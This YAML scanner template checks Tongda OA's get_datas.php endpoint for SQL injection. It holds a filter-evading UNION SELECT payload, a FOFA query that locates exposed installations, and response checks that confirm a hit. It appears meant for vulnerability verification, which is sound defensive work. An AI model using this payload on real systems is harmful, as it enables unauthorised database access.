info:
  vulId: tongda_sqli_get_datas
  detail: 通达OA get_datas.php sql注入漏洞
  fofaQuery: app="TDXK-通达OA"
rules:
  - request:
      payload:
        - 5%20whe\\re%201={`\\=%27`%201}%20un\\ion%20(s\\elect%20database(),MD5(123456))--%20%27
      path: "{{rootUrl}}/general/reportshop/utils/get_datas.php?USER_ID=OfficeTask&PASSWORD=&col=1,1&tab={{payload}}"
      method: GET
      headers:
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36
      redirect: false
      dataTtpe: text
    checksCondition: and
    checks:
      - checkType: string
        desireds:
          - td_oa
          - e10adc3949ba59abbe56e057f20f883e
        place: body
        condition: or

      - checkType: status
        desireds:
          - 200
        condition: and